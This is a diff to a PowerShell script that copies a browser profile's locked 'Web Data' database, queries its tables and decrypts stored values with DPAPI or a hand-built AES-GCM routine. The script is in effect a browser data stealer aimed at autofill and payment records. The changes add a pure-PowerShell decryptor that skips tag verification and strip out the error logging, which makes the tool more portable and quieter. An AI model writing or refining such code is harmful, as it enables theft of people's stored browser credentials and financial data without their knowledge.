@@ -33,7 +33,36 @@ try {
 
     Add-Type -AssemblyName System.Security
 
-    # --- DECRYPT HELPERS ---
+    # --- PURE POWERSHELL AES-GCM DECRYPT ---
+    function Invoke-AesGcmDecrypt {
+        param([byte[]]$Key, [byte[]]$Nonce, [byte[]]$Cipher, [byte[]]$Tag)
+        # AES-CTR keystream
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
+        $aes.Key = $Key
+        $enc = $aes.CreateEncryptor()
+
+        $counter = New-Object byte[] 16
+        $Nonce.CopyTo($counter, 0)
+        $counter[15] = 1
+
+        $out = New-Object byte[] $Cipher.Length
+        $pos = 0
+        while ($pos -lt $Cipher.Length) {
+            $ks = $enc.TransformFinalBlock($counter, 0, 16)
+            $blk = [Math]::Min(16, $Cipher.Length - $pos)
+            for ($i = 0; $i -lt $blk; $i++) { $out[$pos + $i] = $Cipher[$pos + $i] -bxor $ks[$i] }
+            $pos += 16
+            for ($i = 15; $i -ge 12; $i--) {
+                $counter[$i]++
+                if ($counter[$i] -ne 0) { break }
+            }
+        }
+        $enc.Dispose(); $aes.Dispose()
+        return $out
+    }
+
     function Decrypt-Blob {
         param([byte[]]$Blob, [byte[]]$Key)
         if (-not $Blob -or $Blob.Length -eq 0) { return "" }
@@ -42,10 +71,7 @@ try {
                 $nonce  = $Blob[3..14]
                 $cipher = $Blob[15..($Blob.Length-17)]
                 $tag    = $Blob[($Blob.Length-16)..($Blob.Length-1)]
-                $gcm = New-Object System.Security.Cryptography.AesGcm($Key)
-                $plain = New-Object byte[] $cipher.Length
-                $gcm.Decrypt($nonce, $cipher, $tag, $plain)
-                $gcm.Dispose()
+                $plain  = Invoke-AesGcmDecrypt -Key $Key -Nonce $nonce -Cipher $cipher -Tag $tag
                 return [System.Text.Encoding]::UTF8.GetString($plain)
             } else {
                 $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($Blob, $null, 'CurrentUser')
@@ -68,10 +94,8 @@ try {
     function Copy-LockedFile {
         param([string]$Src, [string]$Dst)
         for ($i = 0; $i -lt 5; $i++) {
-            try {
-                Copy-Item $Src $Dst -Force -ErrorAction Stop
-                return $true
-            } catch { Start-Sleep -Milliseconds 200 }
+            try { Copy-Item $Src $Dst -Force -ErrorAction Stop; return $true }
+            catch { Start-Sleep -Milliseconds 200 }
         }
         return $false
     }
@@ -93,7 +117,7 @@ try {
             $webDb = Join-Path $pd.FullName "Web Data"
             if (-not (Test-Path $webDb) -or -not $sqliteLoaded) { continue }
             $tmp = "$env:TEMP\ab_web.db"
-            if (-not (Copy-LockedFile $webDb $tmp)) { "  web db locked" | Out-File $out -Append; continue }
+            if (-not (Copy-LockedFile $webDb $tmp)) { continue }
             try {
                 $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                 $conn.Open()
@@ -117,7 +141,7 @@ try {
                             }
                             $r.Close()
                         }
-                    } catch { "  [$tbl] err" | Out-File $out -Append }
+                    } catch { }
                 }
                 $conn.Close()
             } catch { }
